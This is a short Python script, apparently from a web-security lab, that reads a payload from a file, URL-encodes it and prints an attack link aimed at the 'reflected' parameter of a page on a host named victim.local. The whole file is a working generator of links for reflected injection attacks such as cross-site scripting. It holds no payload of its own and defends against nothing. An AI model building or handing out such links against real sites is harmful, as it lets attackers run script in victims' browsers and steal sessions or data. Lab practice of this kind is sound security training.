from urllib.parse  import quote
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('file')
args = parser.parse_args()

with open(args.file) as file:
    payload = (quote(file.read()))
    print(f'http://victim.local:8181/index.php?page=reflected&param={payload}')

